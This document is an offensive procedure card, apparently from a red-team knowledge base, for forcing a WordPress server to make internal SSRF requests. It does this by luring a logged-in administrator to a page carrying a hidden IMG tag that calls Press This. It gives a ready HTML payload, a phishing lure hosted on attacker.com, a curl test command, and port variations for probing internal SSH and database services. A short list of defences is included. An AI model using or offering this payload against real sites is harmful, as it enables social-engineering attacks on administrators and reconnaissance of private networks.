---
id: proc-wordpress-csrf-ssrf-press-this
tags:
  - ssrf
  - csrf
  - wordpress
  - press-this
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T04:39:02.160Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
---
# Trigger CSRF to Initiate SSRF in WordPress Press This

## Summary

This procedure exploits the lack of CSRF protection and input validation in WordPress's Press This scan feature to force an authenticated victim's server to perform internal SSRF requests, enabling reconnaissance of private network resources such as localhost services on ports like 8080.

## Description

The Press This feature in WordPress allows bookmarklet-based scraping of external URLs via the /wp-admin/press-this.php endpoint. When invoked with url-scan-submit=Scan, it performs a GET request to the provided 'u' parameter without validating for private IPs (e.g., 0.0.0.0, 127.0.0.1, localhost). The endpoint accepts unauthenticated GET requests if session cookies are present, making it vulnerable to CSRF. An attacker hosts a malicious page with an IMG tag that triggers the request from the victim's browser, leveraging their authenticated session to make the WordPress server scan internal addresses. This can reveal sensitive internal services, ports, or data without direct network access.

## Requirements

1. Victim must be logged into WordPress with an active session (e.g., admin role)
2. Attacker controls a website accessible to the victim
3. Target WordPress instance exposes /wp-admin/press-this.php without restrictions
4. Internal services running on private IPs/ports (e.g., 127.0.0.1:8080)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all admin endpoints, especially GET actions
- Validate and sanitize 'u' parameter to block private/reserved IPs (e.g., using PHP's filter_var with FILTER_VALIDATE_URL and IP checks)
- Restrict Press This to POST-only or require authentication headers
- Monitor server logs for anomalous internal requests from web processes
- Use WAF rules to detect requests to private IPs in URL parameters

## Objectives

1. Trick victim into triggering a cross-site request to invoke server-side fetch
2. Force SSRF to scan internal/private resources for reconnaissance
3. Potentially exfiltrate internal service responses via chained vulnerabilities

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Create the CSRF trigger using an HTML IMG tag that embeds the vulnerable endpoint URL, targeting a private address.

No command execution; craft the HTML manually or via a simple web server.

Example payload in malicious.html:

```html
<!DOCTYPE html>
<html>
<body>
<img src="//targetWordpress.com/wp-admin/press-this.php?u=http://127.0.0.1:8080&url-scan-submit=Scan" style="display:none; width:0; height:0;" alt="" />
</body>
</html>
```

> This IMG tag loads silently, sending a GET request with the victim's cookies. Replace targetWordpress.com with the victim's site and 127.0.0.1:8080 with the desired internal target.

### Step 2: Host and Lure Victim

**Context**: Serve the malicious page and use social engineering to direct the authenticated victim to it.

Host the file on an attacker server (e.g., using Python's http.server: python -m http.server 80). Send a phishing link via email or chat: "Check this interesting article: http://attacker.com/malicious.html".

Ensure the victim is logged into WordPress before clicking.

> The browser will automatically fetch the IMG src upon page load, initiating the CSRF.

### Step 3: Verify SSRF Execution

**Context**: Confirm the internal request by observing responses or logs; since it's blind, use timing or known service behaviors.

Access WordPress error logs (e.g., /wp-content/debug.log) if available, or chain with an exfil endpoint. Test locally first: curl "http://target/wp-admin/press-this.php?u=http://127.0.0.1:8080&url-scan-submit=Scan" -b "wordpress_logged_in_*=true".

> Successful SSRF shows internal service response in logs or no validation errors; failed if IP blocked.

### Step 4: Iterate on Targets

**Context**: Expand scanning by varying the 'u' parameter for different ports/IPs.

Update the IMG src with variations: u=http://10.0.0.1:22 for SSH, u=http://localhost:3306 for DB. Reload the malicious page multiple times or use multiple tags.

> Each load triggers a new scan; monitor for open ports via response times or errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- csrf
- wordpress
- press-this
